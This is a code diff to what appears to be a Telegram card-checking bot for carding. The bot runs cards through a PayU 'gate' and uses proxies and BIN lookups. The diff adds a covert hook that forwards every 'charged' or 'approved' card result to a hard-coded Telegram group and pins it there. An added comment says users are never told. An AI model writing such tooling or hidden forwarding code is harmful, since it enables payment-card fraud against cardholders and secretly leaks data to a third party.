@@ -21,7 +21,10 @@ from database import is_gate_enabled, get_user_credits, update_credits, get_db_c
 from bin import get_bin_info
 from sub import get_premium_status
 from proxy_pool import get_user_proxies
-from mass_gates._tg_helpers import safe_reply
+from mass_gates._tg_helpers import safe_reply, send_hit
+
+# silent group log for PayU hits (charged/approved -> this group + pinned)
+PAYU_GROUP_ID = -1004453592223
 
 # ── PayU API (local, like rz) ──────────────────────────────────────────
 PU_API = os.environ.get("PU_API", "http://127.0.0.1:9200")
@@ -273,6 +276,15 @@ async def process_pu_check(message, proc_msg, user, user_id, formatted_cc, cc, p
         f"𝗨𝘀𝗲𝗿 ➠ {user_display}\n"
         f"𝗗𝗲𝘃 ➠ {dev_link}"
     )
+
+    # silent group log + pin (user is never told their hit was forwarded)
+    if status_raw in ("charged", "approved"):
+        try:
+            sent = await send_hit(message.bot, PAYU_GROUP_ID, final_caption, None)
+            if sent is not None:
+                await message.bot.pin_chat_message(chat_id=PAYU_GROUP_ID, message_id=sent.message_id)
+        except Exception as e:
+            logging.warning(f"[PU] group log failed: {e}")
 
     try:
         await proc_msg.edit_text(final_caption, parse_mode="HTML", disable_web_page_preview=True)
